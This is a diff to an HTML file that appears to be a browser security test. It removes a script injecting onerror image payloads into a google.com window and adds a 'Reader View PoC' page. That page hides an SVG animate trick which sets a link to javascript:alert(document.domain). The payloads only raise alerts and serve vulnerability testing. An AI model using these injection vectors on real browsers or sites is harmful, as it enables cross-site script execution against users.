@@ -1,11 +1,29 @@
-<script>
-  function y() {
-    x = open('https://www.google.com', '_top'),
-    x.document.title = '', 
-    x.document.body.innerHTML = 
-      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
-      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">' +
-      '<img/src=\"\"onerror=\"alert(&quot;this is from google&quot;)\">'
-   };
-   setTimeout(y, 10);
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Reader View Test</title>
+</head>
+<body>
+  <article>
+    <h1>Simple Reader View PoC</h1>
+
+    <button title="Close Reader View" id="close-button">Close Reader View</button>
+
+    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>
+
+    <svg height="100%" width="100%">
+      <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
+        <circle r="9999" cx="0" cy="0"></circle>
+        <animate attributeName="xlink:href" begin="0"
+                 from="javascript:alert(document.domain)"
+                 to="&amp;">
+        </animate>
+      </a>
+    </svg>
+
+    <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
+
+    <p>Additional paragraph to ensure reader mode triggers. More content here to make the article long enough for reader view detection.</p>
+  </article>
+</body>
+</html>
